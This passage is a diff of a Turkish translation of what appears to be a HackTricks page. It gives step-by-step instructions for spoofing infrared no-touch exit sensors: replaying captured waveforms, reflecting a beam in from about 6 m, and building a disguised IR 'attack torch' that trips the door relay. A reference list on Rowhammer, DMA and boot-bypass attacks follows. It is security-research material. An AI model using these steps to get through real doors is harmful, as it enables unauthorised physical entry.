-2. **Yalnızca “post-detection” waveform'unu replay edin** – stock emitter'ı çıkarın/ihmal edin ve harici bir IR LED'i başlangıçtan itibaren tetiklenmiş pattern ile sürün. Receiver yalnızca pulse count/frequency ile ilgilendiğinden, spoofed carrier'ı gerçek bir yansıma olarak değerlendirir ve relay line'ı etkinleştirir.
-3. **Transmission'ı gate edin** – receiver'ın AGC'sini veya interference handling logic'ini doyurmadan minimum pulse count'u iletmek için carrier'ı ayarlanmış burst'ler hâlinde gönderin (ör. onlarca milisaniye açık, benzer süre kapalı). Sürekli emission, sensörün hassasiyetini hızla düşürür ve relay'in çalışmasını durdurur.
+1. **Emission profile'ı capture edin** – internal IR LED'i süren hem detection öncesi hem de detection sonrası waveform'ları kaydetmek için controller pin'lerine bir logic analyser bağlayın.
+2. **Yalnızca “post-detection” waveform'unu replay edin** – stock emitter'ı çıkarın veya yok sayın ve harici bir IR LED'i başlangıçtan itibaren zaten tetiklenmiş pattern ile sürün. Receiver yalnızca pulse count/frequency ile ilgilendiğinden, spoofed carrier'ı gerçek bir yansıma olarak kabul eder ve relay line'ı aktif duruma getirir.
+3. **Transmission'ı gate edin** – receiver'ın AGC'sini veya interference handling logic'ini saturate etmeden minimum pulse count'u iletmek için carrier'ı ayarlanmış burst'ler halinde gönderin (ör. onlarca milisaniye açık, benzer süre kapalı). Continuous emission, sensor'ı hızla desensitise eder ve relay'in çalışmasını durdurur.
 
-### Uzun Menzilli Reflective Injection
-- Bench LED'ini yüksek güçlü bir IR diode, MOSFET driver ve focusing optics ile değiştirmek, yaklaşık 6 m mesafeden güvenilir triggering sağlar.
-- Attacker'ın receiver aperture'ına line-of-sight erişimine ihtiyacı yoktur; beam'i camdan görülebilen iç duvarlara, raflara veya kapı çerçevelerine yöneltmek, yansıyan enerjinin yaklaşık 30°'lik field of view'a girmesini sağlar ve yakın mesafeli bir el hareketini taklit eder.
-- Receiver'lar yalnızca zayıf yansımalar beklediğinden, çok daha güçlü bir harici beam birden fazla yüzeyden yansıyabilir ve yine de detection threshold'un üzerinde kalabilir.
+### Long-Range Reflective Injection
+- Bench LED'ini high-power IR diode, MOSFET driver ve focusing optics ile değiştirmek, yaklaşık 6 m mesafeden güvenilir triggering sağlar.
+- Attacker'ın receiver aperture'una line-of-sight erişimine ihtiyacı yoktur; beam'i camdan görülebilen iç duvarlara, raflara veya kapı çerçevelerine yöneltmek, yansıyan enerjinin yaklaşık 30° field of view içine girmesini sağlar ve yakın mesafedeki bir el wave'ini taklit eder.
+- Receiver'lar yalnızca zayıf yansımalar beklediğinden, çok daha güçlü bir harici beam birden fazla yüzeyden bounce ederek detection threshold'un üzerinde kalabilir.
 
 ### Weaponised Attack Torch
-- Driver'ı ticari bir flashlight'ın içine yerleştirmek, aracı herkesin görebileceği bir ortamda gizler. Görünür LED'i receiver'ın bandına uygun yüksek güçlü bir IR LED ile değiştirin, ≈30 kHz burst'ler üretmek için bir ATtiny412 (veya benzeri) ekleyin ve LED akımını sink etmek için bir MOSFET kullanın.
-- Telescopic zoom lens, menzil ve hassasiyet için beam'i daraltırken MCU kontrolündeki bir vibration motoru, görünür ışık yaymadan modulation'ın etkin olduğuna dair haptic confirmation sağlar.
-- Birkaç kayıtlı modulation pattern'i (birbirinden biraz farklı carrier frequency ve envelope'lar) sırayla kullanmak, yeniden markalanmış sensör aileleri arasındaki uyumluluğu artırır; operator böylece relay'in sesli biçimde kliklemesini ve kapının açılmasını sağlayana kadar yansıtıcı yüzeyleri tarayabilir.
+- Driver'ı ticari bir flashlight'ın içine gömmek, aracı göz önünde saklar. Görünür LED'i receiver band'ına uygun high-power IR LED ile değiştirin, ≈30 kHz burst'ler üretmek için bir ATtiny412 (veya benzeri) ekleyin ve LED current'ını sink etmek için bir MOSFET kullanın.
+- Telescopic zoom lens, range/precision için beam'i daraltırken MCU control altındaki bir vibration motor, görünür ışık yaymadan modulation'ın aktif olduğuna dair haptic confirmation sağlar.
+- Birkaç stored modulation pattern arasında cycling yapmak (biraz farklı carrier frequency'leri ve envelope'lar), rebranded sensor family'leri arasındaki compatibility'yi artırır; bu da operator'ın relay'in sesli biçimde click etmesini ve kapının açılmasını sağlayana kadar reflective surface'leri sweep etmesine olanak tanır.
 
 ---
 
 ## References
 
-- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
-- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
-- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
-- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
+- [1] [GDDRHammer: Modern GPU'lardan Cross-Component Rowhammer Attacks ile DRAM Rows'u Greatly Disturbing](https://gddr.fail/files/gddrhammer.pdf)
+- [2] [GeForge: Fun and Profit için GDDR Memory'yi Hammering ile GPU Page Tables Forge Etme](https://stefan1wan.github.io/files/GeForge.pdf)
+- [3] [GPUBreach: Rowhammer Kullanarak GPU'larda Privilege Escalation Attacks](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
+- [4] [NVIDIA - Security Notice: Rowhammer - Temmuz 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
 - [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
 - [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
-- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
-- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
-- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
-- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)
-
+- [7] [SensePost – “Noooooooo Touch! – Covert IR Torch ile IR No-Touch Exit Sensor'larını Bypass Etme”](https://sensepost.com/blog/2025/noooooooooo-touch/)
+- [8] [Mobile-Hacker – “Plug, Play, Pwn: Evil Crow Cable Wind ile Hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
+- [9] [Bruce Schneier - NVIDIA Chips'e Karşı Rowhammer Attack](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
+- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
+- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
+- [12] [Lest We Remember: Encryption Keys'e Karşı Cold Boot Attacks](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
+- [13] [Inception - DMA üzerinden physical memory manipulation](https://github.com/carmaa/inception)
+- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
+- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
+- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
+- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
+- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
 {{#include ../banners/hacktricks-training.md}}
